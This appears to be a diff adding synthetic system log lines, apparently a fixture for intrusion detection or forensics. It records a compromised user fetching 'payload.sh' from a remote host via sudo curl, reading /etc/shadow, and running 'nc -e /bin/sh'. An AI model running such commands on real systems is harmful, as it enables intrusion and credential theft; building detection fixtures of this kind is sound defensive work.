@@ -1,0 +1,5 @@
+Jun  6 03:12:13 web01 sshd[501]: Accepted publickey for alice from 203.0.113.24 port 54001 ssh2
+Jun  6 03:14:44 web01 sudo:    alice : TTY=pts/8 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://203.0.113.9/payload.sh
+Jun  6 03:18:21 web01 sshd[531]: Failed password for invalid user deploy from 198.51.100.7 port 55119 ssh2
+type=PATH msg=audit(1780744680.123:520): item=0 name="/etc/shadow" inode=21 dev=08:01 mode=0100640 ouid=0 ogid=42 rdev=00:00 nametype=NORMAL acct="alice"
+type=EXECVE msg=audit(1780744740.123:521): argc=3 a0="nc" a1="-e" a2="/bin/sh" comm="nc" acct="alice"
